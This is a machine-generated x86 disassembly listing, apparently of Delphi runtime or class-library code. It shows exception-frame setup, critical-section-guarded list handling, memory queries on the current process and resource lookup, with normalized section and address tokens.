mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
movzx eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_4305a0
mov edx eax
mov eax ebp
call sub_405894
test al al
jne r-xdata
sub_42ee1c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42eebd
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4054c8
mov edx esi
mov eax ebx
call sub_42ef04
test al al
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x11
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42eec4
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_433bc4
mov edi eax
mov [ ebx + 0x4 ] edi
mov dl 0x1
mov eax edi
call sub_433b00
sub_42eecc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_42ee1c
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_433bc4
mov [ ebx + 0x8 ] eax
sub_42ef1c
push ebx
push esi
push edi
mov edi edx
mov esi eax
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
mov edx edi
mov eax esi
call sub_42ed60
cmp eax 0xffffffff
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
cmp eax 0x0
jl r-xdata
mov edx eax
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov ebx eax
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp eax edi
jne r-xdata
sub_42ef7c
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi eax
test edx edx
je r-xdata
mov eax [ esi + 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ebp edx
mov edi ebp
call GetCurrentProcess
mov ebx eax
jmp r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x44 ]
push 0x1c
lea eax [ esp + 0x8 ]
push eax
push edi
push ebx
call VirtualQueryEx
cmp eax 0x1c
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov [ esp ] 0x0
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
cmp ebp [ esp + 0x8 ]
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_4305a0
mov edx eax
cmp edx ebp
jb r-xdata
add edi [ esp + 0x10 ]
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov eax [ esi + 0xc ]
call sub_4307d0
xor eax eax
jmp r-xdata
cmp edx edi
jb r-xdata
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
cmp eax 0x0
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
cmp eax 0x0
jl r-xdata
mov ebx eax
dec ebx
cmp ebx 0xffffffff
jne r-xdata
xor ecx ecx
mov edx ebx
mov eax [ esi + 0xc ]
call sub_43074c
mov [ esp ] 0x1
mov ebx eax
xor eax eax
jmp r-xdata
cmp edx edi
jb r-xdata
xor eax eax
jmp r-xdata
cmp edx edi
jb r-xdata
test al al
je r-xdata
mov al 0x1
test al al
je r-xdata
mov al 0x1
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx ebx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
cmp edx ebp
jb r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
cmp edx ebp
jb r-xdata
jmp r-xdata
sub_42f0bc
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_4305a0
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_42edd8
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_42f108
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_4305a0
mov edx edi
call sub_42eb50
pop edi
pop esi
pop ebx
retn
sub_42f128
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4055c0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42ec2c
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4303e0
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_42f19c
push ebx
push esi
push edi
push ebp
call sub_405bb4
mov ebx edx
mov ebp eax
lea eax [ ebp + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ ebp + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x4 ]
call sub_4055f0
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_4055e0
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_405b5c
inc esi
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_4305a0
call sub_4055f0
inc edi
dec esi
jne r-xdata
sub_42f1fc
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_4305a0
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_42ebbc
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_42f240
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_42ecc8
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_4305a0
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_42f284
push ebx
push esi
xor esi esi
call sub_42f1fc
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
xor edx edx
mov eax [ ebx + 0xc ]
call sub_4305a0
mov esi eax
sub_42f2a4
push ebp
mov ebp esp
add esp 0xfffffff0
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_42f31a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4054c8
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x11
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160e8
call sub_4060b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f321
lea eax [ ebp - 0x10 ]
mov edx 0x2
call j_sub_4068c4
retn
sub_42f328
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_42f1fc
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_42eb50
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_42f2a4
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_4305a0
mov ebx eax
cmp ebx [ ebp - 0x10 ]
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
cmp eax 0x0
jl r-xdata
mov esi eax
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_42f1fc
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx [ ebp - 0xc ]
mov eax edi
call sub_405894
test al al
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_42ee1c
sub_42f420
push ebx
push esi
mov esi ecx
mov ebx edx
mov edx ebx
call sub_42f1fc
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx esi
mov edx ebx
call sub_42eecc
sub_42f440
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
movzx eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4305a0
mov edx ebp
call sub_42ef04
test al al
jne r-xdata
sub_42f484
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42ec2c
mov edx eax
mov eax [ edi + 0x4 ]
call sub_4303e0
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4305a0
mov eax [ eax + 0xc ]
mov edx ebp
call sub_430608
test eax eax
jge r-xdata
sub_42f4e0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4305a0
mov edx ebp
call sub_42ef1c
inc esi
dec ebx
jne r-xdata
sub_42f510
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4305a0
mov esi eax
mov edx ebp
mov eax esi
call sub_42ef7c
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_4055f0
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_430438
sub_42f560
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4055c0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
add eax 0x8
push eax
call EnterCriticalSection
xor eax eax
push ebp
push sub_42f673
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f67a
mov eax [ rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4303e0
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_4305a0
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_42edd8
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4303e0
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_4305a0
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_42f67a
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_42f6a0
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4055f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4055e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_42f6d0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
add eax 0x8
push eax
call EnterCriticalSection
xor edx edx
push ebp
push sub_42f75b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_4061a4
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4305a0
mov edx [ ebp - 0x4 ]
call sub_42ecc8
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42f76c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call EnterCriticalSection
xor eax eax
push ebp
push sub_42f7e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f7e9
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
inc ebx
xor esi esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4305a0
call sub_42ed18
inc esi
dec ebx
jne r-xdata
sub_42f800
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42f860
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0x11
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160e8
call sub_4060b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f867
lea eax [ ebp - 0xc ]
call j_sub_4068a0
retn
sub_42f86c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x8
push eax
call EnterCriticalSection
xor eax eax
push ebp
push sub_42f8c8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_42f240
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f8cf
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_42f8d8
push ebx
push esi
mov esi eax
mov eax esi
call sub_42f86c
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_42f800
sub_42f8f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call EnterCriticalSection
xor eax eax
push ebp
push sub_42f974
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_42f440
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_42f408
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f97b
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
mov eax ebx
call sub_40557c
mov ebx eax
sub_42f980
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call EnterCriticalSection
xor eax eax
push ebp
push sub_42f9d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_42f510
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f9e0
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_42f9e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call EnterCriticalSection
xor eax eax
push ebp
push sub_42fa41
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_42f484
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fa48
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_42fa50
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call EnterCriticalSection
xor eax eax
push ebp
push sub_42faae
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_42f328
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fab5
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_42fabc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x8
push eax
call EnterCriticalSection
xor eax eax
push ebp
push sub_42fb20
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_42f0bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fb27
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_42fc78
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
pop ebp
retn 0x8
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_42fcb0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42fc78
mov edx eax
mov eax [ rw-data ]
call sub_430fb8
pop edi
pop esi
pop ebx
retn
sub_42fcdc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_431088
mov esi eax
xor edx edx
push ebp
push sub_42fd46
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4310f8
retn
mov edx ebx
mov eax esi
call sub_4305a0
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0xc ]
mov [ ebp - 0x4 ] eax
call sub_4061a4
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42fd58
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_431088
mov esi eax
xor edx edx
push ebp
push sub_42fdc2
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4310f8
retn
mov edx ebx
mov eax esi
call sub_4305a0
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_4061a4
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42fdd4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x8 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_4110d4
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_42fe18
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x0
inc esi
mov ebx [ ebp - 0x8 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x9 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_4070a8
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
movzx eax [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42fe5c
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_430608
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_4303e0
sub_42feb4
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4305a0
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_42fef4
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_42feb4
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_42ff18
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_407134
push eax
push ebx
call __imp_FindResourceW
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_434af0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42ff8c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_434020
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4055f0
retn
sub_42ff9c
push ebx
call sub_40a7e8
mov ebx [ eax + 0x10 ]
test ebx ebx
jne r-xdata
call sub_40a7e8
mov edx [ eax + 0xc ]
mov eax ebx
call sub_4303e0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov ebx eax
call sub_40a7e8
mov [ eax + 0xc ] ebx
